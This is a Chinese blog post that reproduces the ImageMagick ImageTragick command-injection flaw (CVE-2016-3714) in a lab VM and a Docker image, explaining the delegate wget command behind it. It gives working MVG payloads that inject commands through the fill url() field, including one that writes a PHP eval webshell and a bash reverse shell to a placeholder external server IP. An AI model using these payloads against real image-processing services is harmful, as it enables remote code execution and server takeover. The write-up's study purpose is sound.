---
title: ImageMagick远程命令执行（CVE-2016-3714）复现与理解
date: 2017-05-23 15:56:41
tags:
- 漏洞复现
categories: 
- 漏洞
---


第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。


### ImageMagick简介

ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。
这里是ImageMagick在Linux的convert的 应用http://www.cnblogs.com/ITtangtang/p/3951240.html

<!--more-->

### 参考资料：


初心师傅wp
https://ricterz.me/posts/Write%20Up:%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1  
实验室大佬Isron：  
http://isron.cn/2017/03/29/CVE-2016-3714/  
Rcoll大佬：  
http://rcoil.me/2017/03/CVE-2016-3714/  
Freebuf：  
http://www.freebuf.com/vuls/104048.html  
推酷：  
http://www.tuicool.com/articles/InE7z2e




### 漏洞原理

在ImageMagick解析图片时，如果图片的地址是`https://`开头的，就调用InvokeDelegate，执行MagickCore/delegate.c的[407](https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L407)行
的一条命令
~~~C
<delegate decode=\"https\" command=\"&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;\"/>
（&quot是html的 "）`
~~~
具体的代码执行，函数的调用过程在这篇文章上面（http://www.freebuf.com/vuls/104048.html ）
（PS：我看网上有几篇文章说的执行的是curl命令，在 /etc/ImageMagick/delegates.xml 文件中，内容如下  
~~~
ImageMagick cat /etc/ImageMagick/delegates.xml | grep https <delegate decode="https" command=""curl" -s -k -o "%o" "https:%M""/>`）   
~~~

而其中的%o和%M定义如下:
   
>  %i  input image filename  
>  %o  output image filename  
>  %u  unique temporary filename  
>  %Z  unique temporary filename  
>  %#  input image signature  
>  %b  image file size  
>  %c  input image comment  
>  %g  image geometry  
>  %h  image rows (height)  
>  %k  input image number colors  
>  %l  image label  
>  %m  input image format  
>  %p  page number  
>  %q  input image depth  
>  %s  scene number  
>  %w  image columns (width)  
>  %x  input image x resolution  
>  %y  input image y resolution

执行的命令就是 
~~~
"wget" -q -O  "%o" "https:%M"  
~~~

还有一个版本是curl的，2个命令的作用都是从网络上获取文件。
这个代码本意是从网络上这个地址获取这个图片，

~~~
"wget" -q -O  "1.png" "https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/logo_white_fe6da1ec.png"
~~~
![](https://ooo.0o0.ooo/2017/06/15/594241ab2afa6.png)
ImageMagick官方补丁就是在%M这个地方加了个过滤函数，过滤关键字。


### POC

> 
push graphic-context  
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context

- push和pop是用于堆栈的操作，一个进栈，一个出栈;
- viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;
- fill url()是把图片填充到获取图片地址的元素内;


### 验证


测试环境kali2016
imagemagick版本为6.8.9-9，在漏洞影响范围内
新建一个空的exploit.png，用vi写入poc

> 
push graphic-context  
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -al")'
pop graphic-context


直接使用convert命令
![](https://ooo.0o0.ooo/2017/06/15/5942412545a48.png)
可以明确地看到执行了ls -al命令，如果在web应用上，直接上传一个类似的图片，可以直接执行任何命令。

我这偷懒了，直接在本地有漏洞版本的虚拟机上验证了，没有搭建web服务。
最近也在学docker，然后看到p牛的项目Vulapp上有搭建好的环境，拉下来直接用（最近实验室网不太好，3-400M的东西不好下）。


> 获取镜像  
> docker pull medicean/vulapps:i_imagemagick_1  
> 运行镜像  
> docker run -d -p 8000:80 --name=i_imagemagick_1  
> medicean/vulapps:i_imagemagick_1  
> 进入交互式shell  
> docker run -t -i medicean/vulapps:i_imagemagick_1 "/bin/bash"  


这个镜像里面，该有的都有了
![](https://ooo.0o0.ooo/2017/06/15/594241c20bb35.png)
执行命令

> 
docker exec i_imagemagick_1 convert /poc.png 1.png


![](https://ooo.0o0.ooo/2017/06/15/594241efd3861.png)

效果跟上面一样

### 漏洞运用方式


- 命令执行：


> 
push graphic-context  
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -al")'
pop graphic-context

可以直接在里面写入webshell：



> 
push graphic-context  
viewbox 0 0 640 480  
fill 'url(https://example.com/1.jpg"|echo \\'<?php eval($_POST[\\'Isron\\']);?>\\' shell.php")'  
pop graphic-context

也可以反弹shell：


> 
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/外网服务器ip/12340 0>&1")'
pop graphic-context


这个反弹shell命令原理
> bash -i >& /dev/tcp/外网服务器ip/12340 0>&1  

实验室大大大佬发了一篇[文章](http://byd.dropsec.xyz/2017/04/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90/)，让我茅塞顿开。

